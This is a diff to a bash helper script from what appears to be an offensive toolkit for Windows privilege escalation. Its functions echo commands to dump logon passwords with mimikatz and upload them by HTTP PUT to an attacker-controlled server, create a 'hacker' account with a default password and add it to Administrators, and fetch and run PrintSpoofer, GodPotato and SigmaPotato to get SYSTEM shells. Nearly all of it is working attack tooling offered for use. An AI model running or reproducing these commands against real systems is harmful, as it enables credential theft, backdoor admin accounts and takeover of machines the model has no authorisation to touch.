@@ -39,7 +39,7 @@ windows_escalate_strategy() {
     echo 'Use evil-winrm to connect to a ps session'
     echo 'Use automated enumeratio with winPEAS'
     echo 'cp /usr/share/peass/winpeas/winPEASx64.exe .'
-    echo '$(generate_iwr "winPEASx64.exe")'
+    echo '$(generate_windows_download "winPEASx64.exe")'
     echo '.\winPEASx64.exe'
     echo "Service Binary Hijacking"
     echo "At this point, you must have a proper powershell session via rdp or otherwise"
@@ -106,15 +106,6 @@ create_change_password() {
     x86_64-w64-mingw32-gcc -o change_password.exe change_password.c 
 }
 
-download_winPEAS () {
-    if [ -f winPEASx64.exe ]; then
-        echo "winPEASx64.exe already exists."
-    else
-        wget https://github.com/peass-ng/PEASS-ng/releases/download/20250701-bdcab634/winPEASx64.exe -O winPEASx64.exe
-    fi
-    generate_iwr "winPEASx64.exe"
-}
-
 create_run_windows_shell_exe() {    
     shell=$(get_powershell_reverse_shell $1 $2)
     shell=$(escape_sed "$shell")
@@ -139,8 +130,10 @@ create_run_windows_exe() {
     fi
     command=$(escape_sed "$command")
     cp "$SCRIPTDIR/../c/run_windows.c" run_windows.c
+
     sed -E -i 's/\{command\}/'"$command"'/g' run_windows.c
-    x86_64-w64-mingw32-gcc -o run_windows.exe run_windows_exe.c
+    x86_64-w64-mingw32-gcc -o run_windows.exe run_windows.c
+    generate_windows_download "run_windows.exe"
 }
 
 create_run_windows_dll() {
@@ -157,11 +150,102 @@ create_run_windows_dll() {
 
 get_mimikatz() {
     cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe .
-    generate_iwr "mimikatz.exe"
+    generate_windows_download "mimikatz.exe"
 }
 
 run_mimikatz_logonpasswords() {
-    echo '.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit > mimikatz_logonpasswords.txt;'
-    echo 'iwr -Uri http://'$http_ip':'$http_port'/mimikatz_logonpasswords.txt -Infile mimikatz_logonpasswords.txt -Method Put;'
+    if [[ -z "$mimikatz_log" ]]; then
+        mimikatz_log=mimikatz_logonpasswords.log
+    fi
+    echo '.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit > '"$mimikatz_log"';'
+    echo 'iwr -Uri http://'$http_ip':'$http_port'/'"$mimikatz_log"' -Infile '"$mimikatz_log"' -Method Put;'
 }
 
+netuser_create_admin_user() {
+    if [[ -z "$admin_username" ]]; then
+        admin_username="hacker"
+    fi
+    if [[ -z "$admin_password" ]]; then
+        admin_password="Password123!"
+    fi
+    local cmd="net user $admin_username $admin_password /add"
+    echo "$cmd"
+}
+
+netuser_add_admin_user_to_administrators() {
+    if [[ -z "$admin_username" ]]; then
+        admin_username="hacker"
+    fi
+    if [[ -z "$admin_password" ]]; then
+        admin_password="hacker"
+    fi
+    local cmd="net localgroup Administrators $admin_username /add"
+    echo "$cmd"
+}
+
+netuser_change_user_password() {
+    local username="$1"
+    local password="$2"
+    if [ -z "$username" ]; then
+        echo "Username is required for changing password."
+        exit 1
+    fi
+    if [ -z "$password" ]; then
+        password="Password123!"
+    fi
+    local cmd="net user $username $password"
+    echo "$cmd"
+}
+
+#=========================
+#impersonation escalations
+#=========================
+#rotten potato
+#juicy potato
+#rougewinrm
+#printspoofer
+#https://github.com/itm4n/PrintSpoofer
+#god potato
+#sigma potato
+
+perform_printspoofer() {
+    local printspoofer_url="https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe"
+    if [[ ! -f "printspoofer.exe" ]]; then
+        echo "Downloading PrintSpoofer..." >> $trail_log
+        wget "$printspoofer_url" -O printspoofer.exe >> $trail_log
+    fi
+    echo 'cd C:\windows\temp;'
+    generate_windows_download "printspoofer.exe"
+    if [[ -z "$cmd" ]]; then
+        cmd=$(get_powershell_interactive_shell)
+    fi
+    echo ".\printspoofer.exe -c \"$cmd\""
+}
+
+perform_god_potato() {
+    local god_potato_url="https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe"
+    if [[ ! -f "god_potato.exe" ]]; then
+        echo "Downloading GodPotato..." >> $trail_log
+        wget "$god_potato_url" -O god_potato.exe >> $trail_log
+    fi
+    echo 'cd C:\windows\temp;'
+    generate_windows_download "god_potato.exe"
+    if [[ -z "$cmd" ]]; then
+        cmd=$(get_powershell_interactive_shell)
+    fi
+    echo ".\god_potato.exe -cmd \"$cmd\""
+}
+
+perform_sigma_potato() {
+    local sigma_potato_url="https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe"
+    if [[ ! -f "sigma_potato.exe" ]]; then
+        echo "Downloading SigmaPotato..." >> $trail_log
+        wget "$sigma_potato_url" -O sigma_potato.exe >> $trail_log
+    fi
+    echo 'cd C:\windows\temp;'
+    generate_windows_download "sigma_potato.exe"
+    if [[ -z "$cmd" ]]; then
+        cmd=$(get_powershell_interactive_shell)
+    fi
+    echo ".\sigma_potato.exe \"$cmd\""
+}
